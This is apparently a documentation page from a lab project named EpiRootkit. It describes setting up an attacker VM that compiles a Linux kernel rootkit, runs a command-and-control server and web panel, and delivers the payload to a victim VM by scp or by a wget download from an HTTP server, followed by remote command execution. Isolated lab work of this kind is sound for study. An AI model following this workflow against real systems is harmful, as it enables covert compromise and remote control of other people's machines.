---
title: "Attacker VM Setup"
description: "Configure the attacking VM with C2 server and web interface"
icon: "terminal"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 203
---

# Attacker VM Setup

Configure the attacking VM with Node.js C2 server and React web interface.

## Prerequisites

1. **Host setup complete**: [Host Environment Setup]({{< relref "environment.md" >}})
2. **VM downloaded**: `vm/attacker.qcow2` in project root
3. **VM launched**: `sudo ./scripts/run_vms.sh attacker`

## VM Access

**Connection Details:**
- **IP Address**: 192.168.200.11 (static)
- **Username**: `attacker` 
- **Password**: `jules`
- **Auto-login**: Enabled (no password prompt)

## Setup Method

{{< tabs tabTotal="2" >}}

{{% tab tabName="Pre-built Disk (Recommended)" %}}

### Quick Start

Everything is already set up, so you can immediately build and run:

```bash
# Inside attacker VM (already logged in)
cd epirootkit

# Build rootkit payload for victim deployment
cd rootkit && make clean && make
ls -la epirootkit.ko  # ✅ Compiled payload ready

# Start C2 server
cd ../attacking_program && pnpm install && pnpm start
# ✅ C2 server started on port 4444
# ✅ Web interface started on port 3000
```

### Ready to Use
- **Web Interface**: `http://192.168.200.11:3000`
- **File transfer**: Ready to deploy payload to victim VM

{{% /tab %}}

{{% tab tabName="Self-build from Scratch" %}}

### Fresh VM Setup

If using a fresh Ubuntu VM, you MUST first install dependencies on the attacker VM:

> **⚠️ Required for Fresh VMs**: Run `./scripts/setup_attacker.sh` inside the attacker VM to install Node.js, npm, pnpm, gcc, and other dependencies.

Choose your preferred setup method:

#### Method 1: Automated (Recommended)

**One-Command Setup from Host**
Run this from your host machine (not inside the VM):

```bash
# From host project directory
./scripts/deploy_to_attacker.sh

# ✅ Transfers project files to VM
# ✅ Runs setup_attacker.sh remotely  
# ✅ Installs all dependencies
# 🎉 Ready to build and start
```

**Build and Start**
SSH into the VM and complete setup:
```bash
# SSH into attacker VM
ssh attacker@192.168.200.11

# Build rootkit and start C2 server
cd epirootkit/rootkit && make clean && make
cd ../attacking_program && pnpm install && pnpm start
# ✅ Web interface: http://192.168.200.11:3000
```

#### Method 2: Manual Step-by-Step

**1. Transfer Project Files**
First, get the EpiRootkit project into the VM.

📖 **Complete Guide**: [Host to VM File Transfer]({{< relref "file-transfer.md" >}})

**Recommended: SCP Transfer**
```bash
# From host machine
scp -r /path/to/epirootkit attacker@192.168.200.11:~/

# Then SSH into attacker VM
ssh attacker@192.168.200.11
cd epirootkit
```

**Alternative Methods:**
- **HTTP**: Host runs `python3 -m http.server`, VM downloads with `wget`
- **Shared Folder**: Mount host directory, copy to VM

**2. Install Dependencies (REQUIRED)**
Run the setup script inside the attacker VM:
```bash
# Inside attacker VM, from epirootkit directory
./scripts/setup_attacker.sh

# Installs: Node.js, npm, pnpm, gcc, make, linux-headers, python3, openssh-server
# ✅ Verifies all installations
# 🎉 Ready for build step
```

**3. Build and Start**
Build the rootkit and start the C2 server:
```bash
# Build rootkit payload for victim deployment
cd rootkit && make clean && make
ls -la epirootkit.ko  # ✅ Payload ready

# Install C2 dependencies and start server
cd ../attacking_program && pnpm install && pnpm start
# ✅ C2 server started on port 4444
# ✅ Web interface started on port 3000
```

{{% /tab %}}

{{< /tabs >}}

## Usage

### Deploy Payload to Victim
Transfer the compiled rootkit and deployment script to victim VM:

```bash
# Option A: SCP transfer (requires SSH on victim)
scp rootkit/epirootkit.ko rootkit/deploy_rootkit.sh victim@192.168.200.10:~/

# Option B: HTTP download (simple Python server)
cd rootkit && python3 -m http.server 8080
# On victim: wget http://192.168.200.11:8080/{epirootkit.ko,deploy_rootkit.sh}

# Option C: Web UI upload (via attacking program)
# Use web interface file transfer panel for both files
```

### Monitor C2 Connections
```bash
# List connected clients
ls

# Wait for victim to load module and connect
# Then authenticate and control
auth Client-1 password
exec Client-1 whoami
```

### Web Interface
Access from any device on the network:
- **URL**: `http://192.168.200.11:3000`
- **Login Password**: `password`
- **Features**: Full payload deployment and C2 control

## Configuration Notes

### Attacker VM Role
- **Builds rootkit**: Compiles `epirootkit.ko` for victim deployment
- **C2 server**: Hosts command & control server on port 4444
- **Web interface**: Provides web UI on port 3000
- **File transfer**: Transfers payload to victim via HTTP/SCP/Web UI

### Network Configuration
- **Attacker VM IP**: `192.168.200.11` (static)
- **Default C2 port**: `4444` (matches rootkit defaults)
- **Web interface**: `http://192.168.200.11:3000`

For victim deployment details, see [Victim VM Setup]({{< relref "victim-vm-setup.md" >}}).

## Next Steps

1. **Victim Setup**: [Victim VM Setup]({{< relref "victim-vm-setup.md" >}})
2. **Deploy Rootkit**: Connect victim to this C2 server
3. **Monitor**: Watch for client connections
